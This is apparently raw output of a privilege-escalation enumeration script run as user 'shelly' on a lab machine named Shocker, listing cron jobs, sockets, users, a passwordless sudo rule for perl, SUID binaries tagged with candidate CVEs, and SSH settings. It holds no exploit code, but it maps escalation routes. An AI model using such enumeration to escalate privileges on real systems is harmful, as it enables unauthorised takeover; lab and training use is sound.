-rwxr-xr-x  1 root root  539 Apr  5  2016 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Jun 19  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Sep 21  2022 .
drwxr-xr-x 90 root root 4096 Sep 21  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Sep 21  2022 .
drwxr-xr-x 90 root root 4096 Sep 21  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Sep 21  2022 .
drwxr-xr-x 90 root root 4096 Sep 21  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                                                                                                    
NEXT                         LEFT        LAST                         PASSED       UNIT                         ACTIVATES                                                                                                                   
Wed 2025-04-30 18:02:57 EDT  6h left     Wed 2025-04-30 11:36:44 EDT  20min ago    snap-repair.timer            snap-repair.service
Wed 2025-04-30 22:30:37 EDT  10h left    Wed 2025-04-30 06:52:11 EDT  5h 5min ago  apt-daily.timer              apt-daily.service
Thu 2025-05-01 02:49:28 EDT  14h left    Wed 2025-04-30 02:49:28 EDT  9h ago       systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Thu 2025-05-01 06:13:24 EDT  18h left    Wed 2025-04-30 06:37:28 EDT  5h 20min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2025-05-05 05:14:56 EDT  4 days left Wed 2025-04-30 08:32:28 EDT  3h 25min ago snapd.refresh.timer          snapd.refresh.service
n/a                          n/a         n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                                                                                                    
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                                                                                                                                  
/etc/systemd/system/final.target.wants/snapd.system-shutdown.service could be executing some relative path                                                                                                                                  
/etc/systemd/system/multi-user.target.wants/networking.service could be executing some relative path
/etc/systemd/system/network-online.target.wants/networking.service could be executing some relative path
/etc/systemd/system/sysinit.target.wants/friendly-recovery.service could be executing some relative path
/lib/systemd/system/emergency.service could be executing some relative path
/lib/systemd/system/friendly-recovery.service could be executing some relative path
/lib/systemd/system/ifup@.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                                                                                                   
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                                                                                                 
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                                                                                                   
/run/acpid.socket                                                                                                                                                                                                                           
  └─(Read Write)
/run/apache2/cgisock.1309
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/lib/lxd/unix.socket
  └─(Read Write)
/var/run/apache2/cgisock.1309
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                                                                                                     
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                                                                                                    
:1.0                                   1 systemd         root             :1.0          init.scope                -          -
:1.1                                 964 systemd-logind  root             :1.1          systemd-logind.service    -          -
:1.11                              22088 busctl          shelly           :1.11         apache2.service           -          -
:1.2                                 996 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -
:1.3                                1022 polkitd         root             :1.3          polkitd.service           -          -
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -
org.freedesktop.Accounts             996 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -
org.freedesktop.DBus                 973 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -
org.freedesktop.PolicyKit1          1022 polkitd         root             :1.3          polkitd.service           -          -
org.freedesktop.hostname1              - -               -                (activatable) -                         -
org.freedesktop.locale1                - -               -                (activatable) -                         -
org.freedesktop.login1               964 systemd-logind  root             :1.1          systemd-logind.service    -          -
org.freedesktop.network1               - -               -                (activatable) -                         -
org.freedesktop.resolve1               - -               -                (activatable) -                         -
org.freedesktop.systemd1               1 systemd         root             :1.0          init.scope                -          -
org.freedesktop.timedate1              - -               -                (activatable) -                         -
╔══════════╣ D-Bus config files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                                                                                                     
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)                                                                                                                                      
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)



                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                                                                         
                              ╚═════════════════════╝                                                                                                                                                                                       
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                                                         
link-local 169.254.0.0
ens192    Link encap:Ethernet  HWaddr 00:50:56:94:c4:72  
          inet addr:10.129.7.104  Bcast:10.129.255.255  Mask:255.255.0.0
          inet6 addr: fe80::250:56ff:fe94:c472/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:fe94:c472/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:256011 errors:0 dropped:0 overruns:0 frame:0
          TX packets:147472 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:36863432 (36.8 MB)  TX bytes:35231471 (35.2 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:162 errors:0 dropped:0 overruns:0 frame:0
          TX packets:162 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:11940 (11.9 KB)  TX bytes:11940 (11.9 KB)


╔══════════╣ Hostname, hosts and DNS
Shocker                                                                                                                                                                                                                                     
127.0.0.1       localhost
127.0.1.1       Shocker

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 1.1.1.1
nameserver 8.8.8.8

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                                                                                                
tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp6       0      0 :::2222                 :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                            


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                                                                                                                                     
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)                                                                                                            

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
Matching Defaults entries for shelly on Shocker:                                                                                                                                                                                            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl


╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                                                                                                                       
ptrace protection is enabled (1)                                                                                                                                                                                                            

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2                                                                                                                 
                                                                                                                                                                                                                                            
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                                                      
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 11:57:34 up  9:23,  0 users,  load average: 0.14, 0.04, 0.01                                                                                                                                                                               
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
root     pts/0        Fri Sep 22 15:52:29 2017 - down                      (00:13)     10.10.10.1                                                                                                                                           
shelly   tty1         Fri Sep 22 15:52:14 2017 - down                      (00:14)     0.0.0.0
reboot   system boot  Fri Sep 22 15:51:39 2017 - Fri Sep 22 16:06:17 2017  (00:14)     0.0.0.0
root     pts/0        Fri Sep 22 15:36:41 2017 - Fri Sep 22 15:51:15 2017  (00:14)     10.10.10.1
shelly   tty1         Fri Sep 22 14:08:02 2017 - crash                     (01:43)     0.0.0.0
reboot   system boot  Fri Sep 22 14:02:59 2017 - Fri Sep 22 16:06:17 2017  (02:03)     0.0.0.0
shelly   tty1         Fri Sep 22 12:35:28 2017 - down                      (00:11)     0.0.0.0
reboot   system boot  Fri Sep 22 12:34:37 2017 - Fri Sep 22 12:46:57 2017  (00:12)     0.0.0.0

wtmp begins Fri Sep 22 12:34:37 2017

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                                                                                           
root             tty1                      Wed Sep 21 10:37:25 -0400 2022
shelly           tty1                      Fri Sep 22 15:52:14 -0400 2017

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
                                                                                                                                                                                                                                            
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                                                                            


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                                                                          
                             ╚══════════════════════╝                                                                                                                                                                                       
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                                                                             
/usr/bin/curl
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/usr/share/gcc-5                                                                                                                                                                                                                            

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.18 (Ubuntu)                                                                                                                                                                                      
Server built:   2017-09-18T15:09:02
httpd Not Found
                                                                                                                                                                                                                                            
Nginx version: nginx Not Found
                                                                                                                                                                                                                                            
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Sep 21  2022 /etc/apache2/sites-enabled                                                                                                                                                                         
drwxr-xr-x 2 root root 4096 Sep 21  2022 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Sep 22  2017 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Mar 19  2016 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Sep 22  2017 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>




╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Sep 30  2013 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                                                          
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Sep 21  2022 /etc/pam.d                                                                                                                                                                                         
-rw-r--r-- 1 root root 2133 Apr 28  2016 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                                                                                        
drwxr-xr-x 2 root root 4096 Sep 21  2022 /etc/ldap


╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Sep 22  2017 /usr/share/keyrings                                                                                                                                                                                
drwxr-xr-x 2 root root 4096 Sep 21  2022 /var/lib/apt/keyrings




╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /usr/share/bash-completion/completions/postfix                                                                                                                                                      


╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r----- 1 root adm 24903043 Apr 30 11:51 /var/log/apache2/access.log                                                                                                                                                                     

-rw-r----- 1 root adm 16982841 Apr 30 11:56 /var/log/apache2/error.log

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3486 Apr  3  2012 /etc/skel/.bashrc                                                                                                                                                                                  
-rw-r--r-- 1 shelly shelly 3771 Sep 22  2017 /home/shelly/.bashrc





-rw-r--r-- 1 root root 675 Apr  3  2012 /etc/skel/.profile
-rw-r--r-- 1 shelly shelly 655 Sep 22  2017 /home/shelly/.profile





╔══════════╣ Searching mysql credentials and exec
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
-rw-r--r-- 1 root root 12255 Jul 19  2016 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 18  2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 18  2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 0 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring-removed.gpg
-rw-r--r-- 1 root root 2294 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 1227 May 18  2012 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2256 Feb 26  2016 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 12335 Jul 19  2016 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg


╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                                                                              
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                                                                                                 
                                                                                                                                                                                                                                            




-rw-r--r-- 1 root root 602 Sep 22  2017 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 174 Sep 22  2017 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 94 Sep 22  2017 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 394 Sep 22  2017 /etc/ssh/ssh_host_rsa_key.pub

Port 2222
PermitRootLogin yes
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem                                                                                                                                                                                                                
/etc/ssl/certs/ACEDICOM_Root.pem
/etc/ssl/certs/AC_Raíz_Certicámara_S.A..pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AddTrust_External_Root.pem
/etc/ssl/certs/AddTrust_Low-Value_Services_Root.pem
/etc/ssl/certs/AddTrust_Public_Services_Root.pem
/etc/ssl/certs/AddTrust_Qualified_Certificates_Root.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/ApplicationCA_-_Japanese_Government.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_CA_1.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/CA_Disig.pem
14240PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/doc/openssh-client/examples/sshd_config                                                                                                                                                                                          
AuthorizedKeysFile      .ssh/authorized_keys
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                                                                            


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions                                                                                                                                       
tmux 2.1                                                                                                                                                                                                                                    


/tmp/tmux-1000



                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                                                          
                      ╚════════════════════════════════════╝                                                                                                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
strings Not Found                                                                                                                                                                                                                           
-rwsr-xr-- 1 root messagebus 42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                   
-rwsr-xr-x 1 root root 39K Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 419K Mar 16  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 80K Aug 31  2017 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 40K May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 134K Jul  4  2017 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 49K May 16  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 74K May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 39K May 16  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 33K May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 23K Jan 17  2016 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 33K May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 40K May 16  2017 /bin/su
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 139K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 27K Jun 14  2017 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40K Jun 14  2017 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/unix_chkpwd                                                                                                                                                                                 
-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root tty 27K Jun 14  2017 /usr/bin/wall
-rwxr-sr-x 1 root shadow 23K May 16  2017 /usr/bin/expiry
-rwxr-sr-x 1 root utmp 425K Feb  7  2016 /usr/bin/screen  --->  GNU_Screen_4.5.0
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root mlocate 39K Nov 18  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 61K May 16  2017 /usr/bin/chage
-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root ssh 351K Mar 16  2017 /usr/bin/ssh-agent

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                                                                                                                                      
files with acls in searched folders Not Found                                                                                                                                                                                               
                                                                                                                                                                                                                                            
╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                                                                                              
══╣ Current shell capabilities                                                                                                                                                                                                              
CapInh:  0x0000000000000000=                                                                                                                                                                                                                
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
CapAmb:  0x0000000000000000=

╚ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                                                                                                                                
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
